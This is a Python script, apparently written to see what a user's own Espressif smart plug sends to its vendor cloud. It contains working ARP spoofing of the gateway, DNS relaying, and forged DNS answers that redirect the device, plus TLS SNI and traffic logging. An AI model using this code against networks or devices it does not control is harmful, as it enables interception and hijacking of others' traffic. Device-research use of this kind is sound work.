#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lan-mitm.py —— 局域网流量采集 / 官方云端"旁观"工具

目的（按用户要求）：
    不改插座的任何配置（domain/crt 保持出厂空值，让它照常连官方服务器），
    由我们在二层把它"看住"，采集它到底往外发了什么。

原理（为什么可行）：
    Wi-Fi 下我们看不到别人的单播流量（AP 只转发给目标站点），
    但**广播/组播能收到**。于是：向插座发 ARP 欺骗，声称"网关 192.168.1.1 的 MAC 是我"，
    插座所有**离开本子网**的流量（DNS 查询、连云端 TCP）就都会送到我们网卡上。
    因为插座要访问的 DNS（192.168.1.1 / 223.5.5.5）和云端都在子网外，全都会被我们截到。

    我们**不需要 IP 转发**：只观察（watch），或者直接替它应答 DNS（dns 模式）。

三种模式：
    watch   被动采集：ARP/DHCP/DNS/TLS-SNI/TCP 新连接，全部落盘成样本
    spoof   ARP 欺骗 + 采集（不转发，插座会短暂上不了网，但能看清它想连什么）
    relay   ★ ARP 欺骗 + **DNS 中继**：把插座的 DNS 查询原样转发给真实 DNS，
            再把真实应答还给它 —— 插座**真的**能解析、真的会去连官方服务器，
            我们全程旁观。最贴合"不改设备行为，只看它干什么"。
    dns     ARP 欺骗 + 只截 DNS 并**伪造**应答，把插座"引导"到我们的服务器
            （插座配置不变，它自认为在连官方云端）

用法：
    python tools/lan-mitm.py --mode watch --seconds 300
    python tools/lan-mitm.py --mode relay --target 192.168.1.23 --seconds 600
    python tools/lan-mitm.py --mode dns   --target 192.168.1.23 --fake-ip 192.168.1.20
    python tools/lan-mitm.py --restore    # 恢复（发正确的 ARP）

注意：本工具会向局域网注入 ARP 包。仅在你自己的网络上使用。
"""
import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

from scapy.all import (
    ARP, BOOTP, DHCP, DNS, DNSQR, DNSRR, Ether, ICMP, IP, Raw, TCP, UDP,
    conf, get_if_hwaddr, sendp, sniff, srp,
)

conf.verb = 0

PLUG_OUI = "b4:e6:2d"          # Espressif
LOG = None
SAMPLES = []
START = time.time()


def log(msg, important=False):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    if important:
        line = "\n" + "★" * 3 + " " + line
    print(line, flush=True)
    if LOG:
        LOG.write(line + "\n")
        LOG.flush()


def sample(kind, **kw):
    rec = {"t": round(time.time() - START, 3), "wall": datetime.now().isoformat(timespec="seconds"), "kind": kind}
    rec.update(kw)
    SAMPLES.append(rec)
    return rec


# ---------------------------------------------------------------- 网卡
def pick_iface(our_ip=None):
    """按本机 IP 选网卡；不给就挑第一个有 192.168 地址的非虚拟网卡。"""
    best = None
    for name, iface in conf.ifaces.items():
        ip = getattr(iface, "ip", None) or ""
        if not ip.startswith("192.168."):
            continue
        if "Virtual" in (getattr(iface, "description", "") or "") or "Wi-Fi Direct" in (getattr(iface, "description", "") or ""):
            continue
        if our_ip and ip == our_ip:
            return name, iface
        if best is None:
            best = (name, iface)
    return best if best else (None, None)


# ---------------------------------------------------------------- 解析
def parse_dns_query(pkt):
    try:
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR):
            q = pkt[DNSQR]
            name = q.qname.decode("utf-8", "replace").rstrip(".")
            return name, q.qtype
    except Exception:
        pass
    return None, None


def parse_tls_sni(payload):
    """从 TLS ClientHello 里抠 SNI（纯字节解析，不依赖 scapy 的 tls 层）。"""
    try:
        if len(payload) < 6 or payload[0] != 0x16:
            return None
        if payload[5] != 0x01:          # handshake type = ClientHello
            return None
        p = 9 + 2 + 32                  # 跳过 record(5)+handshake(4)+ver(2)+random(32)
        sid_len = payload[p]
        p += 1 + sid_len
        cs_len = int.from_bytes(payload[p:p + 2], "big")
        p += 2 + cs_len
        comp_len = payload[p]
        p += 1 + comp_len
        if p + 2 > len(payload):
            return None
        ext_total = int.from_bytes(payload[p:p + 2], "big")
        p += 2
        end = min(len(payload), p + ext_total)
        while p + 4 <= end:
            etype = int.from_bytes(payload[p:p + 2], "big")
            elen = int.from_bytes(payload[p + 2:p + 4], "big")
            p += 4
            if etype == 0 and p + 5 <= len(payload):      # server_name
                nlen = int.from_bytes(payload[p + 3:p + 5], "big")
                return payload[p + 5:p + 5 + nlen].decode("ascii", "replace")
            p += elen
    except Exception:
        pass
    return None


# ---------------------------------------------------------------- ARP
def arp_spoof(target_ip, target_mac, spoof_ip, our_mac, iface):
    sendp(Ether(src=our_mac, dst=target_mac) / ARP(
        op=2, psrc=spoof_ip, hwsrc=our_mac, pdst=target_ip, hwdst=target_mac),
        iface=iface, verbose=0)


def arp_restore(target_ip, target_mac, real_ip, real_mac, iface):
    for _ in range(3):
        sendp(Ether(src=real_mac, dst=target_mac) / ARP(
            op=2, psrc=real_ip, hwsrc=real_mac, pdst=target_ip, hwdst=target_mac),
            iface=iface, verbose=0)
        time.sleep(0.3)


def arp_scan(iface, our_ip, timeout=2.5):
    """ARP 扫 /24，返回 {ip: mac}"""
    prefix = ".".join(our_ip.split(".")[:3])
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{prefix}.1-254"),
                 iface=iface, timeout=timeout, verbose=0)
    return {r.psrc: r.hwsrc for _, r in ans}


def arp_table():
    """读 Windows ARP 表（比 srp 稳，网关 MAC 基本都在里面）"""
    import re
    import subprocess
    out = {}
    try:
        r = subprocess.run(["arp", "-a"], capture_output=True, timeout=8)
        txt = r.stdout.decode("gbk", "replace")
        for line in txt.splitlines():
            m = re.match(r"\s*(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F-]{17})\s+", line)
            if m:
                out[m.group(1)] = m.group(2).replace("-", ":").lower()
    except Exception:
        pass
    return out


def find_mac(iface, our_ip, ip):
    """先 ARP 表，再单发 ARP 请求"""
    mac = arp_table().get(ip)
    if mac and not mac.startswith("ff:"):
        return mac
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=iface, timeout=2.5, verbose=0)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None


def dns_relay(payload, dns_server, timeout=3.0):
    """
    把插座原始 DNS 报文（保留其 transaction id）转发给真实 DNS 服务器，取回应答。
    这样插座能拿到**真实**解析结果 → 它会真的去连官方服务器，我们只需旁观。
    注意：我们自己的路由没被影响（ARP 欺骗只针对插座），所以这里能正常出网。
    """
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(payload, (dns_server, 53))
        data, _ = s.recvfrom(4096)
        return data
    except Exception as e:
        return None
    finally:
        s.close()


# ---------------------------------------------------------------- 主逻辑
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["watch", "spoof", "dns", "relay"], default="watch")
    ap.add_argument("--iface", default=None, help="Npcap 接口名（默认自动按 IP 选）")
    ap.add_argument("--our-ip", default="192.168.1.20")
    ap.add_argument("--gateway", default="192.168.1.1")
    ap.add_argument("--target", default=None, help="插座 IP（不给则自动 ARP 扫描找 B4:E6:2D）")
    ap.add_argument("--fake-ip", default="192.168.1.20", help="dns 模式：伪造应答指向的地址")
    ap.add_argument("--seconds", type=int, default=300)
    ap.add_argument("--log", default="lan-capture.log")
    ap.add_argument("--json", default="lan-samples.jsonl")
    ap.add_argument("--restore", action="store_true", help="只发正确的 ARP 恢复网络后退出")
    ap.add_argument("--all", action="store_true", help="不过滤来源：连本机自己的流量也解析（自检用）")
    args = ap.parse_args()

    ifname, iface = (args.iface, None) if args.iface else pick_iface(args.our_ip)
    if args.iface:
        iface = conf.ifaces.dev_from_name(args.iface)
    if ifname is None:
        print("❌ 找不到可用网卡（试试 --iface 指定）")
        return 1
    our_mac = get_if_hwaddr(ifname) if not args.iface else getattr(iface, "mac", None)
    log(f"网卡: {ifname}  本机MAC={our_mac}  本机IP={args.our_ip}  模式={args.mode}")

    gw_mac = find_mac(iface, args.our_ip, args.gateway)
    log(f"网关 {args.gateway} MAC = {gw_mac}")

    # 找插座：先查 ARP 表（最快），再 ARP 扫描
    target_ip, target_mac = args.target, None
    if target_ip is None:
        tbl = arp_table()
        plug = {ip: m for ip, m in tbl.items() if m.startswith(PLUG_OUI)}
        if plug:
            target_ip, target_mac = list(plug.items())[0]
            log(f"从 ARP 表发现插座：{target_ip}  {target_mac}", important=True)

    if target_ip is None or args.restore:
        log("ARP 扫描 /24 找插座（B4:E6:2D）…")
        try:
            table = arp_scan(iface, args.our_ip, 2.5)
            plug = {ip: m for ip, m in table.items() if m.lower().startswith(PLUG_OUI)}
            if plug:
                target_ip, target_mac = list(plug.items())[0]
                log(f"发现插座：{target_ip}  {target_mac}", important=True)
            elif target_ip:
                target_mac = table.get(target_ip)
        except Exception as e:
            log(f"ARP 扫描失败：{e}")

    if target_ip and not target_mac:
        target_mac = find_mac(iface, args.our_ip, target_ip)

    if args.restore:
        if target_ip and target_mac and gw_mac:
            arp_restore(target_ip, target_mac, args.gateway, gw_mac, iface)
            log(f"已向 {target_ip} 恢复正确网关 MAC {gw_mac}")
        else:
            log("恢复所需信息不足（缺插座或网关 MAC）")
        return 0

    if not target_ip or not target_mac:
        if args.all:
            target_ip, target_mac = target_ip or "0.0.0.0", target_mac or "00:00:00:00:00:00"
            log("⚠️ 没找到插座，--all 自检模式：仅解析本机流量")
        else:
            log("❌ 没找到插座。请确认插座已上电并连上本局域网（或 --target 指定 IP）")
            return 2
    log(f"目标插座：{target_ip}  MAC={target_mac}", important=True)

    stop = {"v": False}

    def on_sigint(sig, frm):
        stop["v"] = True
    signal.signal(signal.SIGINT, on_sigint)

    global LOG
    LOG = open(args.log, "w", encoding="utf-8")
    LOG.write(f"===== lan-mitm {args.mode}  {datetime.now():%Y-%m-%d %H:%M:%S} =====\n")

    # ARP 欺骗
    spoofing = args.mode in ("spoof", "dns", "relay")
    if spoofing:
        log(f"开始 ARP 欺骗：告诉插座『{args.gateway} 在我这』（{our_mac}）", important=True)
        log("  → 插座发往子网外的所有流量（DNS + 连云端）都会送到本机")

    seen_flows = set()
    dns_count = {"q": 0, "a": 0}

    def handle(pkt):
        try:
            if not pkt.haslayer(Ether):
                return
            src_mac = pkt[Ether].src.lower()
            is_plug = src_mac == (target_mac or "").lower()
            if args.all:
                is_plug = True          # 自检：把自己的流量也当目标解析
            is_bcast = pkt[Ether].dst.lower().startswith(("ff:ff:ff", "01:00:5e", "33:33"))

            # --- ARP ---
            if pkt.haslayer(ARP) and pkt[ARP].op in (1, 2):
                a = pkt[ARP]
                if a.op == 1:      # request（广播，能看到别人）
                    if is_bcast or is_plug:
                        log(f"ARP 请求 谁有 {a.pdst}？告诉 {a.psrc} ({src_mac})")
                        sample("arp_request", src_ip=a.psrc, src_mac=src_mac, ask=a.pdst)
                else:
                    if is_plug or a.psrc == args.gateway:
                        log(f"ARP 应答 {a.psrc} 在 {a.hwsrc}")
                        sample("arp_reply", ip=a.psrc, mac=a.hwsrc)
                return

            if not is_plug:
                return

            # --- DHCP ---
            if pkt.haslayer(BOOTP):
                b = pkt[BOOTP]
                log(f"DHCP 来自插座：xid=0x{b.xid:08x} chaddr={b.chaddr.hex()} "
                    f"hostname={b.options!r}"[:180])
                sample("dhcp", xid=f"0x{b.xid:08x}", mac=b.chaddr.hex())
                return

            # --- DNS ---
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                name, qtype = parse_dns_query(pkt)
                dns_count["q"] += 1
                dst = pkt[IP].dst if pkt.haslayer(IP) else "?"
                log(f"★ DNS 查询 → {dst}:53   {name}   (type={qtype})", important=True)
                sample("dns_query", name=name, qtype=qtype, server=dst)
                if args.mode == "dns" and pkt.haslayer(UDP):
                    q = pkt[DNS]
                    src_ip = args.gateway if dst == args.gateway else dst
                    resp = (Ether(src=our_mac, dst=target_mac) /
                            IP(src=src_ip, dst=target_ip) /
                            UDP(sport=53, dport=pkt[UDP].sport) /
                            DNS(id=q.id, qr=1, aa=1, rd=q.rd, qd=q.qd,
                                an=DNSRR(rrname=q.qd.qname, type="A", ttl=60, rdata=args.fake_ip)))
                    sendp(resp, iface=iface, verbose=0)
                    dns_count["a"] += 1
                    log(f"  → 已伪造应答：{name} = {args.fake_ip}")
                    sample("dns_forged", name=name, answer=args.fake_ip)

                if args.mode == "relay" and pkt.haslayer(UDP):
                    # 保留插座原始报文（含其 transaction id）转发给真实 DNS
                    payload = bytes(pkt[DNS])
                    ans = dns_relay(payload, dst)
                    if ans:
                        src_ip = args.gateway if dst == args.gateway else dst
                        resp = (Ether(src=our_mac, dst=target_mac) /
                                IP(src=src_ip, dst=target_ip) /
                                UDP(sport=53, dport=pkt[UDP].sport) / Raw(ans))
                        sendp(resp, iface=iface, verbose=0)
                        dns_count["a"] += 1
                        ips, rcode = [], None
                        try:
                            d = DNS(ans)
                            rcode = d.rcode
                            ips = [r.rdata for r in d.an
                                   if getattr(r, "type", None) == 1 and hasattr(r, "rdata")]
                        except Exception:
                            pass
                        if rcode == 3:
                            log(f"  → 真实应答：NXDOMAIN（域名不存在！）")
                        else:
                            log(f"  → 真实应答：{name} = {ips or '(无 A 记录)'}  rcode={rcode}")
                        sample("dns_relayed", name=name, answers=ips, rcode=rcode, server=dst)
                    else:
                        log(f"  ⚠️ 中继失败（真实 DNS {dst} 没回包）")
                        sample("dns_relay_failed", name=name, server=dst)
                return

            # --- TLS ClientHello（SNI）---
            if pkt.haslayer(TCP) and pkt.haslayer("Raw"):
                raw = bytes(pkt["Raw"].load)
                sni = parse_tls_sni(raw)
                if sni:
                    d = pkt[IP].dst
                    log(f"★★★ TLS ClientHello → {d}:{pkt[TCP].dport}   SNI = {sni}", important=True)
                    sample("tls_clienthello", dst=d, dport=pkt[TCP].dport, sni=sni)
                    return

            # --- TCP 新连接 ---
            if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02 and not pkt[TCP].flags & 0x10:
                d = pkt[IP].dst if pkt.haslayer(IP) else "?"
                key = f"{d}:{pkt[TCP].dport}"
                if key not in seen_flows:
                    seen_flows.add(key)
                    log(f"★ TCP SYN → {key}", important=True)
                    sample("tcp_syn", dst=d, dport=pkt[TCP].dport)
                return

            # --- ICMP ---
            if pkt.haslayer(ICMP):
                log(f"ICMP → {pkt[IP].dst if pkt.haslayer(IP) else '?'}")
                sample("icmp", dst=pkt[IP].dst if pkt.haslayer(IP) else "?")
                return

            # --- 兜底：插座发的、上面没识别的**任何**包，也必须记下来 ---
            # （否则像 UDP 之类的流量会被静默丢弃，导致误判"插座什么都没发"）
            smy = pkt.summary()
            log(f"★ 插座其他流量（未识别类型）：{smy}", important=True)
            sample("plug_other", summary=smy, hex=bytes(pkt)[:200].hex())
        except Exception as e:
            log(f"处理包出错：{type(e).__name__} {e}")

    # 抓包（后台线程）
    import threading

    def sniffer():
        sniff(iface=iface, prn=handle, store=False,
              stop_filter=lambda p: stop["v"], timeout=args.seconds)

    th = threading.Thread(target=sniffer, daemon=True)
    th.start()

    t0 = time.time()
    try:
        while not stop["v"] and time.time() - t0 < args.seconds:
            if spoofing:
                arp_spoof(target_ip, target_mac, args.gateway, our_mac, iface)
                if args.mode == "dns":
                    # 同时主动告诉插座「fake_ip 也在我这」—— 确保它把连接发给我们，
                    # 而不是傻等 Windows 的 ARP 应答（可能被延迟/抑制）。
                    arp_spoof(target_ip, target_mac, args.fake_ip, our_mac, iface)
            time.sleep(1.5)
    except KeyboardInterrupt:
        stop["v"] = True

    if spoofing:
        log("恢复插座的真实网关 ARP …")
        if gw_mac:
            arp_restore(target_ip, target_mac, args.gateway, gw_mac, iface)
        log("已恢复")

    # 落盘
    with open(args.json, "w", encoding="utf-8") as f:
        for r in SAMPLES:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    log("")
    log(f"===== 结束：共 {len(SAMPLES)} 条样本，DNS 查询 {dns_count['q']} 条，伪造应答 {dns_count['a']} 条 =====")
    kinds = {}
    for r in SAMPLES:
        kinds[r["kind"]] = kinds.get(r["kind"], 0) + 1
    for k, v in sorted(kinds.items(), key=lambda x: -x[1]):
        log(f"  {k:18s} {v}")
    if LOG:
        LOG.close()
    print(f"\n样本文件：{os.path.abspath(args.json)}")
    print(f"完整日志：{os.path.abspath(args.log)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
